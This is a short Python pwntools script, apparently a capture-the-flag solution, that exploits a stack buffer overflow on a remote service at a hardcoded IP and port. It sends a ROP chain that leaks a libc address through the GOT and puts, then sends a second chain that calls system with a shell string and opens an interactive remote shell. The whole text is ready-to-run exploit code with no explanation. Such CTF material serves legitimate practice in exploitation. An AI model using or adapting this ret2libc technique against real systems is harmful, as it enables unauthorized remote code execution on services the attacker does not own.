from pwn import *

r = remote("35.198.113.131", 31336)

'''
read GOT at 0x404020
puts PLT at 0x40102c
pop rdi at 0x40124b?
main at 0x4011a3
'''
r.sendlineafter("seashell\n\n", "A" * 0x18 + p64(0x40124b) + p64(0x404020) + p64(0x40102c) + p64(0x4011a3))
libc = u64(r.recv(6) + "\x00\x00") - 0xf7250
log.info("libc : " + hex(libc))
r.sendlineafter("seashell\n\n", "A" * 0x18 + p64(0x40124b) + p64(libc + 0x18cd57) + p64(libc + 0x45390))
r.interactive()